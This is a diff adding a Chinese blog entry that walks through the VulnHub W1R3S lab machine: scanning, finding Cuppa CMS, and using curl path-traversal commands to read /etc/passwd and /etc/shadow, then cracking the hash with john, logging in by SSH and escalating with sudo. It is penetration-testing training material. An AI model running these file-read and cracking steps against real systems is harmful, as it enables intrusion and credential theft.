@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>W1R3S-1b靶机详解</title>
+      <link href="/posts/916c.html"/>
+      <url>/posts/916c.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="靶机基本信息">靶机基本信息</h2><p><a href="https://www.vulnhub.com/entry/w1r3s-101,220/">W1R3S: 1.0.1 ~ VulnHub</a></p><p>靶机下载链接见：</p><p><a href="https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip">https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip</a></p><p>下载好之后，用vmware打开即可，将网络适配器设置为NAT模式</p><h2 id="主机发现">主机发现</h2><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292156895.png" alt=""></p><p>也可以使用<mark>nmap</mark>进行主机发现</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292157543.png" alt=""></p><h2 id="信息收集">信息收集</h2><p>简单的全端口扫描：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292158954.png" alt=""></p><p>详细的扫描结果：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292158609.png" alt=""></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292158430.png" alt=""></p><p>从扫描的结果可以看出，存在ftp弱口令</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292159321.png" alt=""></p><p>目录扫描：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292159896.png" alt=""></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292200171.png" alt=""></p><p>访问<a href="http://192.168.255.187/administrator/installation/">http://192.168.255.187/administrator/installation/</a></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292200106.png" alt=""></p><p>发现是Title[Cuppa CMS]框架！CuppaCMS是一套内容管理系统(CMS)!</p><p>使用<mark>whatweb</mark>进行指纹识别：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292200353.png" alt=""></p><h2 id="漏洞发现">漏洞发现</h2><p>谷歌搜索引擎搜索：Cuppa CMS exploit<br>EXP的地址链接：<a href="https://www.exploit-db.com/exploits/25971">https://www.exploit-db.com/exploits/25971</a></p><h2 id="漏洞利用">漏洞利用</h2><p><strong>使用curl工具：</strong></p><p>–data-urlencode：在新版本的CURL中，提供了新的选项 --data-urlencode，通过该选项提供的参数会自动转义特殊字符。</p><p>命令：<code>curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.255.187/administrator/alerts/alertConfigField.php</code></p><p>关键信息结果：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292201682.png" alt=""></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292201200.png" alt=""></p><p>命令：``curl -s --data-urlencode urlConfig=…/…/…/…/…/…/…/…/…/etc/shadow <a href="http://192.168.255.187/administrator/alerts/alertConfigField.php">http://192.168.255.187/administrator/alerts/alertConfigField.php</a> `</p><p>关键信息结果：</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292202030.png" alt=""></p><p>将shadow文件内容（圈出来的）复制到hash.txt中, 然后使用john命令进行破解: <code>sudo john hash.txt</code></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292202415.png" alt=""></p><p>爆破出结果：用户名：w1r3s<br>密码：computer</p><p><strong>ssh登录：</strong></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292202034.png" alt=""></p><h2 id="权限提升">权限提升</h2><p>使用命令<code>sudo -l</code>查看当前用户的权限, 可以发现是全权限</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292203248.png" alt=""></p><p>是全权限, 可以直接执行<code>sudo su</code>获取root用户权限</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292203172.png" alt=""></p><p>读取<mark>root</mark>文件有那些，发现<mark>flag.txt</mark>，读取文件内容</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310292203873.png" alt=""></p><p>整体来说，这个靶机难度较为简单。</p><blockquote><p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果及连带责任自行承担，与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> vulnhub </tag>
+            
+            <tag> 靶机 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>docker学习笔记</title>
       <link href="/posts/ed4b.html"/>
       <url>/posts/ed4b.html</url>
